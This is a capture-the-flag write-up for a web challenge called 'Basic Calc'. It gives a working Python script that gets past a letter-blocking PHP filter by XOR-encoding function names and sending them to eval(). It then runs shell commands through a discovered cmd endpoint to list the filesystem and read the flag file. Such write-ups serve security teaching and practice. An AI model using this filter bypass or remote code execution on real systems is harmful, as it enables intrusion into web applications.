# Basic Calc Writeup (web, 150pts, 88 solved)

## Description
```
Ever used calc based on php?

Link

Author: karma
```

## Task Analysis

Following the link brought me to the following webpage:

![Intro](/GrabConCTF-2021/Basic Calc/screenshots/intro.PNG)

Users are presented with a field designed to serve as a calculator, and immediately below it the unrendered html and php for the page. This made it clear that the field was protected by a WAF designed to disallow any upper or lower case letters as well as the "`" character within the submitted string. Any input that makes it past the WAF is passed to the eval() function. Our task, then, was to bypass this WAF and exploit the use of eval() to execute our own php code and find the flag.

# Solution

After briefly researching the topic I used a modified version of a python script from a [writeup for a previous CTF](https://ironhackers.es/en/tutoriales/saltandose-waf-ejecucion-de-codigo-php-sin-letras/) that bypasses a very similar WAF:

```
import requests
import string

def get_xor_strings(expected, valids):
  word1 = ""
  word2 = ""
  for i in expected:
    for valid in valids:
      result = chr(ord(i) ^ ord(valid))
      if result in valids:
        word1 = word1 + result
        word2 = word2 + valid
        break
  return word1, word2

valids = [ ]
for item in string.printable:
  if item not in string.ascii_letters:
    valids.append(item)
valids = valids[:len(valids)-3]
print("[+] Generated valids => {}".format(valids))
 
expected = "phpinfo"
word1, word2 = get_xor_strings(expected, valids)
print("[+] Word 1 {}- Word2 {}".format(word1, word2))

payload = "666; (\"{}\"^\"{}\")()".format(word1, word2)
print("[+] Sending payload {}".format(payload))
 
response = requests.post('http://35.238.221.234', data={"eq":payload})

print(response.status_code, response.reason)
print(response.content.decode())
```

The script first creates a set of "valid" (i.e. will not trigger the WAF) printable characters. Each character in the "expected" string (the string we would like to be executed by eval()) is masked with a valid character from this set so that the result is another valid character. The masked characters (word1 below) and the valid characters used for the mask (word2 below) are then returned:  

```
def get_xor_strings(expected, valids):
  word1 = ""
  word2 = ""
  for i in expected:
    for valid in valids:
      result = chr(ord(i) ^ ord(valid))
      if result in valids:
        word1 = word1 + result
        word2 = word2 + valid
        break
  return word1, word2

valids = [ ]
for item in string.printable:
  if item not in string.ascii_letters:
    valids.append(item)
valids = valids[:len(valids)-3]
```

Masking is removed when the eval() statement applies the XOR operator ("^") included in the final payload string, which cancels out the initial masking. Something to note is that performing an XOR on two strings works here because php will perform [type juggling](https://www.php.net/manual/en/language.types.type-juggling.php) when evaluating strings in a numerical context:

```
expected = "phpinfo"
word1, word2 = get_xor_strings(expected, valids)
print("[+] Word 1 {}- Word2 {}".format(word1, word2))

payload = "666; (\"{}\"^\"{}\")()".format(word1, word2)
print("[+] Sending payload {}".format(payload))
```

I executed the script with "phpinfo()" encoded as the payload and achieved the following output:

![working_bypass](/GrabConCTF-2021/Basic Calc/screenshots/phpinfo.PNG)

Receiving the desired output of phpinfo() determined that the bypass was working. I executed the script with "print_r(scandir(/var/www/html/))" as the payload to print out the current directory's contents:

![scandir](/GrabConCTF-2021/Basic Calc/screenshots/scandir.PNG)

I repeated running the script using "show_source(12.php)" to retrieve the contents of the file (the same was done for file.txt but it was empty of meaningful content):

![show_source](/GrabConCTF-2021/Basic Calc/screenshots/show_source.PNG)

Upon rendering the response to make it more readable, I had:

![rendered_response](/GrabConCTF-2021/Basic Calc/screenshots/rendered_response.PNG)

This file gave me an endpoint that could execute whatever bash commands I wanted to send to it using a GET request, which would allow me to navigate the file system much more easily. So I used the Burp decoder tool to URL encode the following:

![burp_encode_find](/GrabConCTF-2021/Basic Calc/screenshots/burp_encode_find_flag.PNG)

And sent it to the endpoint:
```
import requests

#find / -name *flag*
response = requests.post('http://35.238.221.234/12.php?cmd=%66%69%6e%64%20%2f%20%2d%6e%61%6d%65%20%2a%66%6c%61%67%2a')

print(response.status_code, response.reason)
print(response.content.decode())
```
I recieved the following output:
![find_output](/GrabConCTF-2021/Basic Calc/screenshots/find_flag_output.PNG)

I repeated the above for "cat /flagggg.txt", and received:

![flag](/GrabConCTF-2021/Basic Calc/the_flag.PNG)

And I found the flag: "GrabCON{b4by_php_f0r_y0u}"
